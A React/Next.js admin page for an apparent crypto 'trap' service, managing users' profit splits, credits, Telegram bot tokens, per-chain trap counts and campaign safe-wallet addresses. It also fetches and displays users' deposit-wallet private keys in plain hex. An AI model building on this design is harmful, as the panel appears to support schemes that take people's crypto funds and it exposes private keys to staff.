'use client';

import { useEffect, useState } from 'react';
import { supabase } from '@app-lib/supabaseClient';
import { useRouter, usePathname } from 'next/navigation';
import Link from 'next/link';
import { RefreshCw, Eye, Copy, Check, PlusCircle, MinusCircle, Wallet, Pencil, X } from 'lucide-react';

interface User {
  id: string;
  email: string;
  profit_split_percent: number;
  telegram_bot_token: string | null;
  telegram_chat_id: string | null;
  created_at: string;
  credits: number;
  total_traps: number;
  trap_counts: Record<string, number>;
  safe_wallets: string[];
}

interface Campaign {
  id: string;
  chain: string;
  safe_wallet_address: string;
}

export default function AdminPage() {
  const router = useRouter();
  const pathname = usePathname();
  const [users, setUsers] = useState<User[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  const [refreshing, setRefreshing] = useState(false);
  const [selectedUserId, setSelectedUserId] = useState<string | null>(null);
  const [privateKey, setPrivateKey] = useState<string | null>(null);
  const [depositAddress, setDepositAddress] = useState<string | null>(null);
  const [showKey, setShowKey] = useState(false);
  const [copySuccess, setCopySuccess] = useState(false);
  const [fetchingKey, setFetchingKey] = useState(false);
  const [fundAmounts, setFundAmounts] = useState<Record<string, number>>({});
  const [fundingUserId, setFundingUserId] = useState<string | null>(null);
  const [withdrawAmounts, setWithdrawAmounts] = useState<Record<string, number>>({});
  const [withdrawingUserId, setWithdrawingUserId] = useState<string | null>(null);
  const [copiedSafeWallet, setCopiedSafeWallet] = useState<string | null>(null);

  // ─── Safe Wallet Modal State ───
  const [safeWalletModalUserId, setSafeWalletModalUserId] = useState<string | null>(null);
  const [safeWalletCampaigns, setSafeWalletCampaigns] = useState<Campaign[]>([]);
  const [safeWalletLoading, setSafeWalletLoading] = useState(false);
  const [safeWalletSaving, setSafeWalletSaving] = useState(false);
  const [safeWalletChanges, setSafeWalletChanges] = useState<Record<string, string>>({});

  // ─── Toast state ───
  const [toast, setToast] = useState<{ message: string; type: 'success' | 'error' } | null>(null);

  const showToast = (message: string, type: 'success' | 'error') => {
    setToast({ message, type });
    setTimeout(() => setToast(null), 3000);
  };

  const fetchUsers = async (showLoading = true) => {
    if (showLoading) setLoading(true);
    else setRefreshing(true);

    const res = await fetch('/api/admin/users');
    if (!res.ok) {
      if (res.status === 403) {
        router.push('/dashboard');
        return;
      }
      const json = await res.json();
      setError(json.error || 'Failed to fetch users');
      setLoading(false);
      setRefreshing(false);
      return;
    }
    const data = await res.json();
    setUsers(data);
    setLoading(false);
    setRefreshing(false);
  };

  useEffect(() => {
    const checkAdminAndFetch = async () => {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session) {
        router.push('/login');
        return;
      }
      await fetchUsers(true);
    };
    checkAdminAndFetch();
  }, [router]);

  const updateProfitSplit = async (userId: string, newPercent: number) => {
    try {
      const res = await fetch(`/api/admin/users/${userId}/profit-split`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ profitSplitPercent: newPercent }),
      });

      if (res.ok) {
        const updated = await res.json();
        setUsers(users.map(u => u.id === userId ? { ...u, profit_split_percent: updated.profit_split_percent } : u));
        showToast(`✅ Profit split updated to ${newPercent}% for ${updated.email}`, 'success');
      } else {
        const json = await res.json();
        showToast(`❌ Error: ${json.error || 'Update failed'}`, 'error');
      }
    } catch (err) {
      showToast('❌ Network error: Could not connect to server', 'error');
    }
  };

  const handleRefresh = () => {
    fetchUsers(false);
  };

  const viewPrivateKey = async (userId: string) => {
    setFetchingKey(true);
    setPrivateKey(null);
    setDepositAddress(null);
    setShowKey(false);
    try {
      const res = await fetch(`/api/admin/private-key/${userId}`);
      if (!res.ok) {
        const err = await res.json();
        showToast(`Error: ${err.error || 'Failed to fetch key'}`, 'error');
        return;
      }
      const data = await res.json();
      setPrivateKey(data.privateKey);
      setDepositAddress(data.depositAddress);
      setSelectedUserId(userId);
      setShowKey(true);
    } catch (err) {
      showToast('Network error', 'error');
    } finally {
      setFetchingKey(false);
    }
  };

  const closeModal = () => {
    setShowKey(false);
    setPrivateKey(null);
    setSelectedUserId(null);
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopySuccess(true);
    setTimeout(() => setCopySuccess(false), 3000);
  };

  const handleAddCredits = async (userId: string, amount: number) => {
    if (!amount || amount <= 0) {
      showToast('Enter a positive amount', 'error');
      return;
    }
    setFundingUserId(userId);
    try {
      const res = await fetch(`/api/admin/users/${userId}/balance`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ amount, description: 'Admin manual funding', type: 'add' }),
      });
      if (!res.ok) {
        const err = await res.json();
        showToast(`Error: ${err.error || 'Failed to add credits'}`, 'error');
        return;
      }
      const updated = await res.json();
      setUsers(users.map(u => u.id === userId ? { ...u, credits: updated.credits } : u));
      setFundAmounts(prev => ({ ...prev, [userId]: 0 }));
      showToast(`✅ Added $${amount} credits to user`, 'success');
    } catch (err) {
      showToast('Network error', 'error');
    } finally {
      setFundingUserId(null);
    }
  };

  const handleWithdrawCredits = async (userId: string, amount: number) => {
    if (!amount || amount <= 0) {
      showToast('Enter a positive amount', 'error');
      return;
    }
    setWithdrawingUserId(userId);
    try {
      const res = await fetch(`/api/admin/users/${userId}/balance`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ amount, description: 'Admin manual withdrawal', type: 'withdraw' }),
      });
      if (!res.ok) {
        const err = await res.json();
        showToast(`Error: ${err.error || 'Failed to withdraw credits'}`, 'error');
        return;
      }
      const updated = await res.json();
      setUsers(users.map(u => u.id === userId ? { ...u, credits: updated.credits } : u));
      setWithdrawAmounts(prev => ({ ...prev, [userId]: 0 }));
      showToast(`✅ Withdrawn $${amount} credits from user`, 'success');
    } catch (err) {
      showToast('Network error', 'error');
    } finally {
      setWithdrawingUserId(null);
    }
  };

  // ─── Safe Wallet Modal Functions ───
  const openSafeWalletModal = async (userId: string) => {
    setSafeWalletModalUserId(userId);
    setSafeWalletLoading(true);
    setSafeWalletChanges({});
    try {
      const res = await fetch(`/api/admin/users/${userId}/campaigns`);
      if (!res.ok) {
        const err = await res.json();
        showToast(`Error: ${err.error || 'Failed to fetch campaigns'}`, 'error');
        setSafeWalletModalUserId(null);
        return;
      }
      const data = await res.json();
      setSafeWalletCampaigns(data);
    } catch {
      showToast('Network error', 'error');
      setSafeWalletModalUserId(null);
    } finally {
      setSafeWalletLoading(false);
    }
  };

  const handleSafeWalletChange = (campaignId: string, newAddress: string) => {
    setSafeWalletChanges(prev => ({ ...prev, [campaignId]: newAddress }));
  };

  const saveSafeWallets = async () => {
    setSafeWalletSaving(true);
    try {
      const updatePromises = Object.entries(safeWalletChanges).map(([campaignId, newAddress]) =>
        fetch(`/api/admin/campaigns/${campaignId}/safe-wallet`, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ safeWalletAddress: newAddress }),
        })
      );

      const results = await Promise.all(updatePromises);
      const allOk = results.every(r => r.ok);

      if (allOk) {
        showToast('✅ Safe wallets updated successfully', 'success');
        setSafeWalletModalUserId(null);
        await fetchUsers(false);
      } else {
        showToast('❌ Some updates failed. Check console for details.', 'error');
      }
    } catch {
      showToast('❌ Network error', 'error');
    } finally {
      setSafeWalletSaving(false);
    }
  };

  if (loading) return <div className="min-h-screen flex items-center justify-center text-gray-300">Loading...</div>;
  if (error) return <div className="min-h-screen flex items-center justify-center text-red-400">{error}</div>;

  const totalTraps = users.reduce((sum, u) => sum + (u.total_traps || 0), 0);

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-gray-900 p-6">
      {/* ─── Toast Notification ─── */}
      {toast && (
        <div className={`fixed top-4 right-4 z-50 px-6 py-3 rounded-xl shadow-lg transition-all duration-300 ${
          toast.type === 'success' ? 'bg-green-600/90 text-white' : 'bg-red-600/90 text-white'
        }`}>
          {toast.message}
        </div>
      )}

      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <div className="mb-6 flex flex-wrap items-center justify-between gap-4">
          <div>
            <h1 className="text-3xl font-bold text-white tracking-tight">
              <span className="bg-gradient-to-r from-blue-400 to-purple-500 bg-clip-text text-transparent">
                Admin Panel
              </span>
              <span className="ml-2 text-gray-400 text-lg font-normal">– User Management</span>
            </h1>
            <p className="text-gray-400 mt-1">
              Manage user profit splits, Telegram settings, credits, and view deposit private keys.
              <span className="ml-4 text-blue-400">Total Traps: <strong>{totalTraps}</strong></span>
            </p>
          </div>
          <div className="flex items-center gap-4">
            <span className="text-gray-400 text-sm">{users.length} users</span>
            <button
              onClick={handleRefresh}
              disabled={refreshing}
              className="flex items-center gap-2 px-4 py-2 bg-gray-700/50 text-gray-300 rounded-lg hover:bg-gray-600/50 transition-colors disabled:opacity-50"
            >
              <RefreshCw size={16} className={refreshing ? 'animate-spin' : ''} />
              Refresh
            </button>
          </div>
        </div>

        {/* Sub‑navigation */}
        <div className="flex gap-6 mb-6 border-b border-gray-700 pb-3">
          <Link href="/admin" className={`text-sm font-medium transition-colors ${pathname === '/admin' ? 'text-blue-400' : 'text-gray-400 hover:text-white'}`}>👥 Users</Link>
          <Link href="/admin/deposits" className={`text-sm font-medium transition-colors ${pathname === '/admin/deposits' ? 'text-blue-400' : 'text-gray-400 hover:text-white'}`}>💰 Deposits</Link>
          <Link href="/admin/wallets" className={`text-sm font-medium transition-colors ${pathname === '/admin/wallets' ? 'text-blue-400' : 'text-gray-400 hover:text-white'}`}>🏦 Wallets</Link>
          <Link href="/admin/pending" className={`text-sm font-medium transition-colors ${pathname === '/admin/pending' ? 'text-blue-400' : 'text-gray-400 hover:text-white'}`}>📋 Pending</Link>
          <Link href="/admin/clore" className={`text-sm font-medium transition-colors ${pathname === '/admin/clore' ? 'text-blue-400' : 'text-gray-400 hover:text-white'}`}>⚙️ Clore</Link>
        </div>

        {/* Table */}
        <div className="bg-gray-800/50 backdrop-blur-sm rounded-2xl border border-gray-700 shadow-2xl overflow-hidden">
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead>
                <tr className="border-b border-gray-700 bg-gray-900/50">
                  <th className="px-6 py-4 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Email</th>
                  <th className="px-6 py-4 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Profit Split</th>
                  <th className="px-6 py-4 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Credits</th>
                  <th className="px-6 py-4 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Traps (by chain)</th>
                  <th className="px-6 py-4 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Safe Wallets</th>
                  <th className="px-6 py-4 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Telegram</th>
                  <th className="px-6 py-4 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Chat ID</th>
                  <th className="px-6 py-4 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Joined</th>
                  <th className="px-6 py-4 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-700">
                {users.map((user) => {
                  const chainLabels = Object.entries(user.trap_counts || {})
                    .map(([chain, count]) => `${chain.toUpperCase()}: ${count}`)
                    .join('  ');
                  return (
                    <tr key={user.id} className="hover:bg-gray-700/30 transition-colors">
                      <td className="px-6 py-4 text-gray-300 font-medium">{user.email}</td>
                      <td className="px-6 py-4">
                        <div className="flex items-center gap-2">
                          <input
                            type="number"
                            min="0"
                            max="100"
                            step="any"
                            value={user.profit_split_percent}
                            onChange={(e) => {
                              const val = parseFloat(e.target.value);
                              if (!isNaN(val)) {
                                setUsers(users.map(u => u.id === user.id ? { ...u, profit_split_percent: val } : u));
                              }
                            }}
                            className="w-20 bg-gray-700 border border-gray-600 text-white rounded-lg px-3 py-1.5 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                          />
                          <span className="text-gray-400">%</span>
                        </div>
                      </td>
                      <td className="px-6 py-4 text-gray-300">
                        ${user.credits?.toFixed(2) || '0.00'}
                      </td>
                      <td className="px-6 py-4 text-gray-300">
                        <div>
                          <span className="font-medium">{user.total_traps || 0}</span>
                          {chainLabels && (
                            <div className="text-xs text-gray-400 font-mono">{chainLabels}</div>
                          )}
                        </div>
                      </td>
                      <td className="px-6 py-4 text-gray-300">
                        {user.safe_wallets && user.safe_wallets.length > 0 ? (
                          <div className="flex flex-wrap gap-1">
                            {user.safe_wallets.map((addr, idx) => {
                              const isCopied = copiedSafeWallet === addr;
                              return (
                                <span
                                  key={idx}
                                  className="text-xs font-mono bg-gray-700/50 px-2 py-0.5 rounded flex items-center gap-1"
                                >
                                  {addr.slice(0, 6)}…{addr.slice(-4)}
                                  <button
                                    onClick={() => {
                                      navigator.clipboard.writeText(addr);
                                      setCopiedSafeWallet(addr);
                                      setTimeout(() => setCopiedSafeWallet(null), 2000);
                                    }}
                                    className="text-gray-400 hover:text-white transition-colors"
                                    title="Copy address"
                                  >
                                    {isCopied ? (
                                      <Check size={12} className="text-green-400" />
                                    ) : (
                                      <Copy size={12} />
                                    )}
                                  </button>
                                </span>
                              );
                            })}
                          </div>
                        ) : (
                          <span className="text-gray-500">—</span>
                        )}
                      </td>
                      <td className="px-6 py-4">
                        {user.telegram_bot_token ? (
                          <span className="inline-flex items-center gap-1 text-green-400">
                            <span className="w-2 h-2 bg-green-400 rounded-full"></span>
                            Connected
                          </span>
                        ) : (
                          <span className="text-gray-500">Not set</span>
                        )}
                      </td>
                      <td className="px-6 py-4 text-gray-400 font-mono text-xs">
                        {user.telegram_chat_id || '—'}
                      </td>
                      <td className="px-6 py-4 text-gray-400">
                        {new Date(user.created_at).toLocaleDateString('en-US', {
                          year: 'numeric',
                          month: 'short',
                          day: 'numeric',
                        })}
                      </td>
                      <td className="px-6 py-4 space-y-2">
                        <div className="flex flex-wrap gap-2">
                          <button
                            onClick={() => updateProfitSplit(user.id, user.profit_split_percent)}
                            className="px-4 py-1.5 bg-gradient-to-r from-blue-600 to-purple-600 text-white text-sm font-medium rounded-lg hover:from-blue-500 hover:to-purple-500 transition-all shadow-lg shadow-blue-500/20"
                          >
                            Save
                          </button>
                          <button
                            onClick={() => viewPrivateKey(user.id)}
                            disabled={fetchingKey && selectedUserId === user.id}
                            className="px-3 py-1.5 bg-amber-500/20 text-amber-400 text-sm font-medium rounded-lg hover:bg-amber-500/30 transition-all flex items-center gap-1"
                          >
                            <Eye size={14} />
                            View Key
                          </button>
                          <button
                            onClick={() => openSafeWalletModal(user.id)}
                            className="px-3 py-1.5 bg-blue-500/20 text-blue-400 text-sm font-medium rounded-lg hover:bg-blue-500/30 transition-all flex items-center gap-1"
                          >
                            <Wallet size={14} />
                            Safe Wallets
                          </button>
                        </div>

                        {/* Add Credits */}
                        <div className="flex items-center gap-2 mt-1">
                          <input
                            type="number"
                            min="0"
                            step="1"
                            placeholder="Add"
                            value={fundAmounts[user.id] || ''}
                            onChange={(e) => {
                              const val = parseFloat(e.target.value);
                              setFundAmounts(prev => ({ ...prev, [user.id]: isNaN(val) ? 0 : val }));
                            }}
                            className="w-20 bg-gray-700 border border-gray-600 text-white rounded-lg px-2 py-1 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                          />
                          <button
                            onClick={() => handleAddCredits(user.id, fundAmounts[user.id] || 0)}
                            disabled={fundingUserId === user.id}
                            className="px-2 py-1 bg-green-600/70 text-white text-xs rounded-lg hover:bg-green-500/70 transition-all flex items-center gap-1 disabled:opacity-50"
                          >
                            <PlusCircle size={14} />
                            Add
                          </button>
                        </div>

                        {/* Withdraw Credits */}
                        <div className="flex items-center gap-2 mt-1">
                          <input
                            type="number"
                            min="0"
                            step="1"
                            placeholder="Withdraw"
                            value={withdrawAmounts[user.id] || ''}
                            onChange={(e) => {
                              const val = parseFloat(e.target.value);
                              setWithdrawAmounts(prev => ({ ...prev, [user.id]: isNaN(val) ? 0 : val }));
                            }}
                            className="w-20 bg-gray-700 border border-gray-600 text-white rounded-lg px-2 py-1 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                          />
                          <button
                            onClick={() => handleWithdrawCredits(user.id, withdrawAmounts[user.id] || 0)}
                            disabled={withdrawingUserId === user.id}
                            className="px-2 py-1 bg-red-600/70 text-white text-xs rounded-lg hover:bg-red-500/70 transition-all flex items-center gap-1 disabled:opacity-50"
                          >
                            <MinusCircle size={14} />
                            Withdraw
                          </button>
                        </div>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        </div>

        <div className="mt-6 text-center text-gray-500 text-xs">
          Only administrators can access this panel. Profit split values are in percent.
        </div>
      </div>

      {/* ─── Safe Wallet Modal ─── */}
      {safeWalletModalUserId && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-gray-800 rounded-2xl border border-gray-700 max-w-2xl w-full max-h-[80vh] overflow-y-auto p-6 shadow-2xl">
            <div className="flex justify-between items-start mb-4">
              <h3 className="text-white font-semibold text-lg">Manage Safe Wallets</h3>
              <button
                onClick={() => setSafeWalletModalUserId(null)}
                className="text-gray-400 hover:text-white transition-colors"
              >
                <X size={20} />
              </button>
            </div>

            {safeWalletLoading ? (
              <div className="text-gray-400">Loading campaigns...</div>
            ) : (
              <div className="space-y-4">
                {safeWalletCampaigns.length === 0 ? (
                  <p className="text-gray-400">No campaigns found for this user.</p>
                ) : (
                  safeWalletCampaigns.map((campaign) => (
                    <div key={campaign.id} className="bg-gray-900/50 rounded-xl p-4 border border-gray-700">
                      <div className="flex flex-wrap items-center gap-2 mb-2">
                        <span className="text-white font-medium">{campaign.chain.toUpperCase()}</span>
                        <span className="text-gray-400 text-xs">(ID: {campaign.id.slice(0, 8)}…)</span>
                      </div>
                      <div className="flex flex-wrap items-center gap-2">
                        <input
                          type="text"
                          value={safeWalletChanges[campaign.id] !== undefined ? safeWalletChanges[campaign.id] : campaign.safe_wallet_address || ''}
                          onChange={(e) => handleSafeWalletChange(campaign.id, e.target.value)}
                          placeholder="0x..."
                          className="flex-1 bg-gray-700 border border-gray-600 text-white rounded-lg px-3 py-1.5 text-sm font-mono focus:outline-none focus:ring-2 focus:ring-blue-500"
                        />
                        <button
                          onClick={() => {
                            if (campaign.safe_wallet_address) {
                              navigator.clipboard.writeText(campaign.safe_wallet_address);
                              showToast('✅ Copied to clipboard', 'success');
                            }
                          }}
                          className="px-2 py-1 bg-gray-600/50 hover:bg-gray-500/50 rounded text-gray-300 transition-colors"
                          title="Copy original address"
                        >
                          <Copy size={14} />
                        </button>
                      </div>
                    </div>
                  ))
                )}
              </div>
            )}

            <div className="mt-6 flex gap-3 justify-end">
              <button
                onClick={() => setSafeWalletModalUserId(null)}
                className="px-4 py-2 bg-gray-700/50 text-gray-300 rounded-lg hover:bg-gray-600/50 transition-colors"
              >
                Cancel
              </button>
              <button
                onClick={saveSafeWallets}
                disabled={safeWalletSaving || Object.keys(safeWalletChanges).length === 0}
                className="px-4 py-2 bg-gradient-to-r from-blue-600 to-purple-600 text-white rounded-lg hover:from-blue-500 hover:to-purple-500 transition-all disabled:opacity-50"
              >
                {safeWalletSaving ? 'Saving...' : 'Save Changes'}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Private Key Modal (unchanged) */}
      {showKey && selectedUserId && privateKey && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-gray-800 rounded-2xl border border-gray-700 max-w-lg w-full p-6 shadow-2xl">
            <div className="flex justify-between items-start mb-4">
              <h3 className="text-white font-semibold text-lg">Private Key</h3>
              <button onClick={closeModal} className="text-gray-400 hover:text-white transition-colors">✕</button>
            </div>
            {depositAddress && (
              <div className="mb-3">
                <p className="text-gray-400 text-xs">Deposit Address</p>
                <code className="text-white text-sm font-mono bg-gray-900/50 px-2 py-1 rounded border border-gray-700 block break-all">{depositAddress}</code>
              </div>
            )}
            <div>
              <p className="text-gray-400 text-xs mb-1">Private Key (hex)</p>
              <div className="bg-gray-900/50 border border-gray-700 rounded-lg p-3 flex items-center justify-between gap-2">
                <code className="text-white text-xs font-mono break-all flex-1">{privateKey}</code>
                <button
                  onClick={() => copyToClipboard(privateKey)}
                  className="flex items-center gap-1 px-2 py-1 bg-gray-700/50 hover:bg-gray-600/50 rounded transition-colors text-gray-300 text-xs"
                >
                  {copySuccess ? <Check size={14} className="text-green-400" /> : <Copy size={14} />}
                  {copySuccess ? 'Copied' : 'Copy'}
                </button>
              </div>
            </div>
            <div className="mt-4 text-xs text-yellow-400 bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-3">
              ⚠️ This private key gives full control of the user's deposit wallet. Only share with authorised personnel.
            </div>
            <div className="mt-4 flex justify-end">
              <button onClick={closeModal} className="px-4 py-2 bg-gray-700/50 text-gray-300 rounded-lg hover:bg-gray-600/50 transition-colors">Close</button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}